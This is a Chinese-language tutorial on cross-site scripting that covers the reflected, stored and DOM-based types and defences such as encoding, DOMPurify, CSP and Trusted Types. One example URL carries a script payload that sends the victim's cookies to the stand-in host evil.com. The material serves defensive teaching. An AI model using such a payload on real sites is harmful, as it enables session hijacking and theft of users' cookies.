XSS 攻击与防御

XSS 概述

跨站脚本攻击（Cross-Site Scripting，XSS）是指攻击者将恶意脚本注入到受信任的网页中，当其他用户浏览该页面时，脚本在用户浏览器中执行，从而窃取 Cookie、会话令牌或执行任意操作。XSS 长期位列 OWASP Top 10，是 Web 应用中最常见的安全漏洞之一。攻击者可以利用 XSS 实现会话劫持、钓鱼攻击、键盘记录、网页篡改和蠕虫传播等多种攻击目标。

XSS 类型 注入位置 持久性 触发方式
反射型 URL 参数 非持久 用户点击恶意链接
存储型 数据库/服务端 持久 用户访问受感染页面
DOM 型 客户端 DOM 非持久 客户端 JS 处理不当

反射型 XSS

反射型 XSS 的恶意脚本通过 URL 参数传递，服务端未经处理直接将其嵌入响应 HTML。用户点击攻击者构造的链接后，脚本在浏览器中执行。

https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

攻击链路：

反射型 XSS 在搜索框、错误页面、URL 重定向等场景中最为常见。攻击者通常通过短链接服务或社交工程隐藏恶意 URL 的真实内容，提高受害者的点击率。




存储型 XSS
存储型 XSS 的恶意脚本被持久化存储在服务端（如数据库、评论系统），所有访问该内容的用户都会受到攻击。危害范围远大于反射型。

在昵称或简介中嵌入恶意代码




富文本编辑器
通过 HTML 标签注入事件处理器




文件名
上传文件名包含 onerror 属性





2005 年 MySpace 上的 Samy 蠕虫是存储型 XSS 的经典案例。攻击者 Samy Kamkar 在个人资料中注入 JavaScript，当其他用户查看其页面时，恶意脚本自动将受害者添加为好友并复制到受害者的个人资料中，仅 20 小时内感染超过 100 万用户。




DOM 型 XSS
DOM 型 XSS 完全发生在客户端，恶意输入通过 location.hash、document.referrer 等 DOM API 进入页面，被 JavaScript 不安全地写入 DOM。与反射型和存储型不同，DOM 型 XSS 的恶意载荷不经过服务端，因此服务端的输入过滤对其无效。

上下文敏感编码是防御 XSS 的核心原则。同一段用户输入在 HTML 正文、属性、JavaScript 字符串、URL 中需要不同的编码处理，使用通用的 HTML 编码无法覆盖所有场景。


输入净化
DOMPurify.sanitize(userInput);
对富文本场景，使用白名单方式只允许安全的 HTML 标签和属性。DOMPurify 是目前最可靠的客户端净化库，支持自定义策略：


DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
});
Content Security Policy (CSP)
CSP 通过 HTTP 响应头声明页面允许加载的资源来源，是防御 XSS 的最后一道防线。


Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'




CSP 指令
作用





default-src
所有资源的默认策略




script-src
JavaScript 来源限制




style-src
CSS 来源限制




img-src
图片来源限制




connect-src
AJAX/WebSocket 限制




report-uri
违规报告接收地址





CSP 的 nonce 模式要求每个合法的 <script> 标签携带服务端生成的随机 nonce 值，未携带正确 nonce 的脚本会被浏览器拒绝执行，从而有效阻断注入的脚本。


其他防御措施




措施
说明





HttpOnly Cookie
禁止 JavaScript 读取敏感 Cookie




X-XSS-Protection
浏览器内置 XSS 过滤器（已逐步废弃）




Trusted Types
限制危险 DOM API 只接受类型安全的值




Subresource Integrity
验证外部脚本的完整性





Trusted Types 是较新的浏览器安全特性，通过在 CSP 中启用 require-trusted-types-for 'script'，强制所有 DOM XSS Sink 只接受经过策略验证的 TrustedHTML/TrustedScript 对象，从根本上消除 DOM XSS。




小结
    

  • XSS 分为反射型、存储型、DOM 型三种，存储型危害最大
    • 

  • 输出编码是最基本的防御措施，必须根据上下文选择正确编码
    • 

  • DOMPurify 是富文本净化的首选方案
    • 

  • CSP 作为纵深防御的关键层，能有效限制脚本执行范围
    • 

  • 将 Cookie 设置为 HttpOnly 可阻止 XSS 窃取会话令牌
    • 

  • Trusted Types 是下一代 DOM XSS 防护机制，推荐在新项目中启用
    •
